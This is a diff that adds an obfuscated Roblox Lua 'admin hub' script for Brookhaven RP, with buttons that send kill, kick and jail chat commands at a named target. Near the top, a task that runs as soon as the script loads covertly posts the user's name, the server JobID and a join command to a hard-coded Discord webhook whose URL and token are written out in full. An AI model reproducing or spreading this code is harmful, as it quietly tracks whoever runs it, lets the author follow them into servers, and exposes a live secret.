@@ -1,0 +1,128 @@
+--[[ 
+    Jotinha12hr2 Hub's Admin - V20 WEBHOOK EDITION
+    [SYNC: ATIVO] | [JOBID TRACKER: ATIVO] | [OBFUSCATED]
+]]
+
+repeat task.wait() until game:IsLoaded()
+
+-- CONFIGURAÇÃO DO WEBHOOK
+local _0xW = "https://discord.com/api/webhooks/1457780083124207626/F0AR-Na0rucf2CncuNsXC4yGRYC-Kpjg1XkOdb6YaHgDcOZlVhwym4KwhriXSYaBeZSj" 
+
+local _0x50 = game:GetService("\80\108\97\121\101\114\115")
+local _0x4C = _0x50.LocalPlayer
+local _0x52 = game:GetService("\82\117\110\83\101\114\118\105\99\101")
+local _0x43 = game:GetService("\67\111\114\101\71\117\105")
+local _0xH = game:GetService("\72\116\116\112\83\101\114\118\105\99\101")
+
+-- [ SISTEMA DE WEBHOOK ]
+task.spawn(function()
+    if _0xW ~= "" and _0xW ~= "SEU_WEBHOOK_AQUI" then
+        local data = {
+            ["content"] = "📢 **Novo Servidor Detectado!**",
+            ["embeds"] = {{
+                ["title"] = "Jotinha12hr2 Hub's Admin - Tracker",
+                ["description"] = "O usuário entrou em uma partida!",
+                ["color"] = 16768256,
+                ["fields"] = {
+                    {["name"] = "👤 Usuário", ["value"] = _0x4C.Name, ["inline"] = true},
+                    {["name"] = "🏡 Mapa", ["value"] = "Brookhaven RP", ["inline"] = true},
+                    {["name"] = "🆔 JobID", ["value"] = "```" .. game.JobId .. "```", ["inline"] = false},
+                    {["name"] = "🔗 Console Join", ["value"] = "```game:GetService('TeleportService'):TeleportToPlaceInstance("..game.PlaceId..", '"..game.JobId.."', game.Players.LocalPlayer)```", ["inline"] = false}
+                }
+            }}
+        }
+        local json = _0xH:JSONEncode(data)
+        _0xH:PostAsync(_0xW, json)
+    end
+end)
+
+-- [ INTERFACE DIVINA ]
+local _0x504 = (_0x43 or _0x4C:WaitForChild("\80\108\97\121\101\114\71\117\105"))
+if _0x504:FindFirstChild("\74\111\116\97\65\100\109\105\110") then _0x504["\74\111\116\97\65\100\109\105\110"]:Destroy() end
+
+local _0x47 = Instance.new("\83\99\114\101\101\110\71\117\105", _0x504)
+_0x47.Name = "\74\111\116\97\65\100\109\105\110"
+
+-- [ BOTÃO JH RGB ]
+local _0x425 = Instance.new("\84\101\120\116\66\111\116\116\111\110", _0x47)
+_0x425.Size = UDim2.new(0, 50, 0, 50)
+_0x425.Position = UDim2.new(0, 15, 0.5, -25)
+_0x425.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+_0x425.Text = "\74\72"
+_0x425.Font = Enum.Font.LuckiestGuy
+_0x425.TextSize = 22
+Instance.new("\85\73\67\111\114\110\101\114", _0x425).CornerRadius = UDim.new(1, 0)
+local _0x535 = Instance.new("\85\73\83\116\114\111\101\107", _0x425)
+_0x535.Thickness = 3
+_0x52.RenderStepped:Connect(function()
+    local c = Color3.fromHSV(tick() % 5 / 5, 0.8, 1)
+    _0x535.Color = c
+    _0x425.TextColor3 = c
+end)
+
+-- [ FRAME PRINCIPAL ]
+local _0x4D = Instance.new("\70\114\97\109\101", _0x47)
+_0x4D.Size = UDim2.new(0, 280, 0, 360)
+_0x4D.Position = UDim2.new(0.5, -140, 0.5, -180)
+_0x4D.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
+_0x4D.Draggable = true
+_0x4D.Active = true
+Instance.new("\85\73\67\111\114\110\101\114", _0x4D)
+local _0xST = Instance.new("\85\73\83\116\114\111\101\107", _0x4D)
+_0xST.Color = Color3.fromRGB(255, 215, 0)
+_0xST.Thickness = 2
+
+_0x425.MouseButton1Click:Connect(function() _0x4D.Visible = not _0x4D.Visible end)
+
+local _0xTL = Instance.new("\84\101\120\116\76\97\98\101\108", _0x4D)
+_0xTL.Size = UDim2.new(1, 0, 0, 45)
+_0xTL.Text = "Jotinha12hr2 Hub's Admin"
+_0xTL.TextColor3 = Color3.fromRGB(255, 215, 0)
+_0xTL.BackgroundTransparency = 1
+_0xTL.Font = Enum.Font.GothamBold
+_0xTL.TextSize = 16
+
+local _0xSC = Instance.new("\83\99\114\101\108\108\105\110\103\70\114\97\109\101", _0x4D)
+_0xSC.Size = UDim2.new(1, -10, 1, -55)
+_0xSC.Position = UDim2.new(0, 5, 0, 50)
+_0xSC.BackgroundTransparency = 1
+_0xSC.CanvasSize = UDim2.new(0, 0, 3, 0)
+_0xSC.ScrollBarThickness = 0
+local _0xLS = Instance.new("\85\73\76\105\115\116\76\97\121\111\117\116", _0xSC)
+_0xLS.Padding = UDim.new(0, 8)
+_0xLS.HorizontalAlignment = Enum.HorizontalAlignment.Center
+
+-- [ BOTÕES E SYNC ]
+local _0xNI = Instance.new("\84\101\120\116\66\111\120", _0xSC)
+_0xNI.Size = UDim2.new(0, 240, 0, 35)
+_0xNI.PlaceholderText = "NICK DO ALVO"
+_0xNI.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+_0xNI.TextColor3 = Color3.new(1, 1, 1)
+Instance.new("\85\73\67\111\114\110\101\114", _0xNI)
+
+local _0xCM = {"Kill", "Void", "Jail", "Unjail", "Kick", "Bring", "Freeze", "Unfreeze", "Spin", "Unspin", "Blind", "Jump", "Sit"}
+for _, _0xN in pairs(_0xCM) do
+    local b = Instance.new("\84\101\120\116\66\111\116\116\111\110", _0xSC)
+    b.Size = UDim2.new(0, 240, 0, 35)
+    b.Text = _0xN .. " SYNC"
+    b.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    b.TextColor3 = Color3.new(1, 1, 1)
+    Instance.new("\85\73\67\111\114\110\101\114", b)
+    b.MouseButton1Click:Connect(function()
+        local m = "/" .. _0xN:lower() .. " " .. _0xNI.Text
+        game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(m, "All")
+    end)
+end
+
+-- TAG RGB
+task.spawn(function()
+    _0x4C.CharacterAdded:Connect(function(char)
+        local h = char:WaitForChild("Head")
+        local bg = Instance.new("BillboardGui", h)
+        bg.Size = UDim2.new(0, 200, 0, 50) bg.AlwaysOnTop = true bg.ExtentsOffset = Vector3.new(0, 3, 0)
+        local tx = Instance.new("TextLabel", bg)
+        tx.Size = UDim2.new(1, 0, 1, 0) tx.BackgroundTransparency = 1 tx.Font = Enum.Font.LuckiestGuy tx.TextSize = 25
+        tx.Text = (_0x4C.Name == "jotinha12hr2" and "[DONO] " or "[USER] ") .. _0x4C.DisplayName
+        _0x52.RenderStepped:Connect(function() tx.TextColor3 = Color3.fromHSV(tick() % 5 / 5, 0.8, 1) end)
+    end)
+end)
